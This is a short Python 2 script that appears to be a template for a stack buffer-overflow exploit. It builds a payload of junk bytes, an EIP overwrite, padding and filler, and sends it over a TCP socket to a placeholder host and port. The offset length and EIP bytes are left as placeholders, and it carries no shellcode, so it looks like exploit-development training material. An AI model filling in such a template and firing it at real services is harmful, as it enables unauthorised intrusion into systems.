#!/usr/bin/python

import socket

rhost = "0.0.0.0"
rport = 1234

junk = "A" * #
eip = "\x??\x??\x??\x??"
offset = "C" * 4

buffer = "D" * (1500 - len(junk) - len(eip) - len(offset))

payload = junk + eip + offset + buffer

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((rhost,rport))
print "Sending payload..."
s.send(payload)
s.close()
